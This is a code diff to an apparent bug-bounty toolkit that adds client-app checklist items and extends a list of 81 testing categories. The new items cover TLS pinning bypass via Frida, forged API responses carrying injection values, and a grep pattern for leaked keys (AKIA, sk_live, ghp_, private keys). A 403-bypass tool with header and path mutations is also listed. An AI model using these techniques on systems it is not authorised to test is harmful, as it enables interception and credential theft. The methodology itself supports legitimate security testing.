+			"Client->API TLS/cert-validation: set the client to talk to a MITM CA (Frida SSL-pinning-bypass on mobile; proxychains + self-signed CA on desktop) and confirm the app REJECTS the untrusted chain — an app that connects without validating the server certificate on ANY channel (API host, telemetry, update endpoint, WebSocket) allows full passive+active interception, credential theft and command injection into the app session",
+			"API-response -> command-sink injection: a desktop/embedded client that interpolates server-returned fields (update URL, plugin path, feature-flag string, download filename) into shell/exe/SQLite calls — attacker-controlled server data reaching child_process/spawn/shell_exec; test by simulating a forged API response (MITM or local overrides) carrying quotes, backticks, path traversal and type-confusion values",
+			"Desktop bundle static credential extraction: unpack the app bundle (asar for Electron, .app/Contents/Resources, win-unpacked resources) and grep for hardcoded secrets — API keys, HMAC/JWT signing keys, cloud credentials, license keys — asar extract + 'grep -rn AKIA|sk_live|ghp_|client_secret|BEGIN PRIVATE KEY' over the JS/resources; also check update feeds and license servers the bundle hardcodes"
 		],
-		techniques: ["extension postMessage origin pinning", "manifest host-permission audit", "config-driven exec fuzzing", "sudo-wrapper LPE check", "kill-switch packet capture", "native host ID validation"]
+		techniques: ["extension postMessage origin pinning", "manifest host-permission audit", "config-driven exec fuzzing", "sudo-wrapper LPE check", "kill-switch packet capture", "native host ID validation", "client TLS validation bypass test", "API-response command-sink injection", "asar/bundle secret grep"]
 	},
 
 ];
@@ -2470,7 +2511,7 @@ const TOOLS = [
 	},
 	{
 		name: "bb_checklist",
-		description: "Bug bounty methodology checklist (80 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
+		description: "Bug bounty methodology checklist (81 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps, idp-confusion). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
 		parameters: {
 			type: "object",
 			additionalProperties: false,
@@ -6074,7 +6115,7 @@ const GUIDANCE = [
 	"- bb_tech_detect(url) — fingerprint the tech stack from headers, cookies and HTML (WordPress, Next.js, Nuxt, Drupal, Joomla, React, jQuery, nginx, IIS, Cloudflare, ...).",
 	"- bb_wayback_urls(domain, limit?) — archived URLs from the Wayback CDX API; flags interesting endpoints/params (id, file, redirect, token, auth, download, cmd, admin, api, .env, .git, swagger, graphql).",
 	"- bb_recon(domain) — one-shot pipeline: enum -> probe -> tech detect -> header audit; returns live hosts + findings (missing headers, leaks, cookie flags, http-only hosts).",
-	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (80 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
+	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (81 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks, client-apps, idp-confusion). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
 	"- bb_actuator_scan(url) — probe Spring Boot Actuator endpoints (/actuator/env, /heapdump, /jolokia, ...) for exposed internals, high-risk hits and default config.",
 	"- bb_js_secrets(domain, limit?) — mine archived JS bundles from the Wayback CDX API for leaked secrets (AWS keys, Google API keys, JWTs, generic key/secret pairs).",
 	"- bb_403_bypass(url) — try HTTP method flips, routing headers (X-Original-URL, X-Forwarded-For, X-Real-IP) and path mutations (/./, /%2e/, ;, %00, ..;/ etc) against a 403.",
